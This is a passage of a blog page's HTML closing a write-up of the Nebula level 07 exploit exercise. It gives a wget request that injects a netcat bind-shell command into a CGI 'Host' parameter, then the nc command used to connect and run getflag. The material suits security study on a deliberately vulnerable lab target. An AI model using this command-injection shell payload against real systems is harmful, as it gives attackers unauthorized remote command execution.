+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi?<span style="color: #007800;">Host</span>=<span style="color: #000000; font-weight: bold;">%</span>3Bmkfifo<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>3Bcat<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>7Cbash<span style="color: #000000; font-weight: bold;">%</span>7Cnc<span style="color: #000000; font-weight: bold;">%</span>20-l<span style="color: #000000; font-weight: bold;">%</span>204444<span style="color: #000000; font-weight: bold;">%</span>202<span style="color: #000000; font-weight: bold;">%</span>3E<span style="color: #000000; font-weight: bold;">%</span>261<span style="color: #000000; font-weight: bold;">%</span>3E<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>3Brm<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Ffifo<span style="color: #000000; font-weight: bold;">%</span>3B</pre></td></tr></table>
+<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi?Host=%3Bmkfifo%20%2Ftmp%2Fpipe%3Bcat%20%2Ftmp%2Fpipe%7Cbash%7Cnc%20-l%204444%202%3E%261%3E%2Ftmp%2Fpipe%3Brm%20%2Ftmp%2Ffifo%3B</p>
+</div>
+
+<p>Now I just connect from another tty session or another machine on the network (though you&#8217;ll have to edit the command if you do that) using:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">nc localhost <span style="color: #000000;">4444</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">nc localhost 4444</p>
+</div>
+
+<p>Now I can run any command including whoami and getflag</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-07/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-218 -->
+
+				
+							<nav id="nav-below">
+				<h3 class="assistive-text">Post navigation</h3>
+				<div class="nav-previous"><a href="/page/3/"><span class="meta-nav">&larr;</span> Older posts</a></div>
+				<div class="nav-next"><a href="/">Newer posts <span class="meta-nav">&rarr;</span></a></div>
+			</nav><!-- #nav-above -->
+			
+			
+			</div>
+<!-- #content -->
+		</div>
+<!-- #primary -->
+
+		<div id="secondary" class="widget-area" role="complementary">
+			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
+<a class="rsswidget rss-widget-feed" href="/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/">grobinson.me RSS feed</a>
+</h3>
+<ul><li><a class="rsswidget" href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside><aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+</aside>
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
+									</li>
+											<li>
+					<a href="/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
+									</li>
+											<li>
+					<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
+									</li>
+											<li>
+					<a href="/i-passed-oscp/">I passed OSCP!</a>
+									</li>
+											<li>
+					<a href="/fristileaks-1-3/">FristiLeaks 1.3</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
+<ul id="recentcomments">
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link">Daniel</span> on <a href="/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
+</li>
+<li class="recentcomments">
+<span class="comment-author-link"><a href="/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
+</li>
+</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
+			<ul>
+					<li><a href="/2018/07/">July 2018</a></li>
+	<li><a href="/2018/04/">April 2018</a></li>
+	<li><a href="/2017/10/">October 2017</a></li>
+	<li><a href="/2017/08/">August 2017</a></li>
+	<li><a href="/2017/06/">June 2017</a></li>
+	<li><a href="/2016/08/">August 2016</a></li>
+	<li><a href="/2014/11/">November 2014</a></li>
+	<li><a href="/2013/01/">January 2013</a></li>
+	<li><a href="/2012/12/">December 2012</a></li>
+	<li><a href="/2012/11/">November 2012</a></li>
+	<li><a href="/2012/10/">October 2012</a></li>
+	<li><a href="/2012/09/">September 2012</a></li>
+	<li><a href="/2012/08/">August 2012</a></li>
+			</ul>
+
+			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-47">
+<a href="/category/ios/jailbreak/appsync/">AppSync</a>
+</li>
+	<li class="cat-item cat-item-16">
+<a href="/category/infosec/hash/crack/brute-force/">Brute Force</a>
+</li>
+	<li class="cat-item cat-item-62">
+<a href="/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="/category/career/">Career</a>
+</li>
+	<li class="cat-item cat-item-20">
+<a href="/category/comic/">Comic</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="/category/infosec/compromise/">Compromise</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="/category/infosec/conference/">Conference</a>
+</li>
+	<li class="cat-item cat-item-13">
+<a href="/category/infosec/hash/crack/">Crack</a>
+</li>
+	<li class="cat-item cat-item-48">
+<a href="/category/development/">Development</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="/category/education/">Education</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="/category/email/">Email</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/category/infosec/encryption/">Encryption</a>
+</li>
+	<li class="cat-item cat-item-30">
+<a href="/category/exploit/">Exploit</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="/category/exploit-excercises/">Exploit Excercises</a>
+</li>
+	<li class="cat-item cat-item-58">
+<a href="/category/exploit/exploit-db/">exploit-db</a>
+</li>
+	<li class="cat-item cat-item-21">
+<a href="/category/os-x/filevault/">FileVault</a>
+</li>
+	<li class="cat-item cat-item-24">
+<a href="/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="/category/passwords/google-authenticator/">Google Authenticator</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/category/infosec/hash/">Hash</a>
+</li>
+	<li class="cat-item cat-item-14">
+<a href="/category/infosec/hash/crack/hashcat/">HashCat</a>
+</li>
+	<li class="cat-item cat-item-25">
+<a href="/category/email/hotmail/">Hotmail</a>
+</li>
+	<li class="cat-item cat-item-61">
+<a href="/category/exploit/exploit-development/immunity/">Immunity</a>
+</li>
+	<li class="cat-item cat-item-4">
+<a href="/category/infosec/">Information Security</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="/category/ios/">iOS</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="/category/ios/jailbreak/">JailBreak</a>
+</li>
+	<li class="cat-item cat-item-8">
+<a href="/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
+</li>
+	<li class="cat-item cat-item-57">
+<a href="/category/kali/">Kali</a>
+</li>
+	<li class="cat-item cat-item-33">
+<a href="/category/passwords/lastpass/">LastPass</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="/category/lesson-learned/">Lesson Learned</a>
+</li>
+	<li class="cat-item cat-item-39">
+<a href="/category/unix/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-60">
+<a href="/category/exploit/exploit-development/mona-py/">mona.py</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="/category/education/online-course/">Online Course</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="/category/os-x/">OS X</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="/category/education/online-course/oscp/">OSCP</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="/category/passwords/password-complexity/">Password Complexity</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="/category/passwords/password-reuse/">Password Reuse</a>
+</li>
+	<li class="cat-item cat-item-18">
+<a href="/category/passwords/">Passwords</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/category/infosec/pentest/">Penetration Test</a>
+</li>
+	<li class="cat-item cat-item-29">
+<a href="/category/php/">PHP</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="/category/passwords/plaintext/">Plaintext</a>
+</li>
+	<li class="cat-item cat-item-56">
+<a href="/category/pwk/">PWK</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="/category/development/python/">Python</a>
+</li>
+	<li class="cat-item cat-item-15">
+<a href="/category/infosec/hash/salt/">Salt</a>
+</li>
+	<li class="cat-item cat-item-28">
+<a href="/category/shell/">Shell</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="/category/education/online-course/stanford-online/">Stanford Online</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-38">
+<a href="/category/unix/">Unix</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="/category/web-server/">Web Server</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="/category/infosec/webapp/">WebApp</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="/category/infosec/white-hat/">White Hat</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="/category/infosec/webapp/windows-live/">Windows Live</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="/category/development/xcode/">XCode</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="/category/comic/xkcd/">XKCD</a>
+</li>
+			</ul>
+
+			</aside>		</div>
+<!-- #secondary .widget-area -->
+
+	</div>
+<!-- #main -->
+
+	<footer id="colophon">
+
+			
+
+			<div id="site-generator">
+												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
+					Proudly powered by WordPress				</a>
+			</div>
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
+
+</body>
+</html>
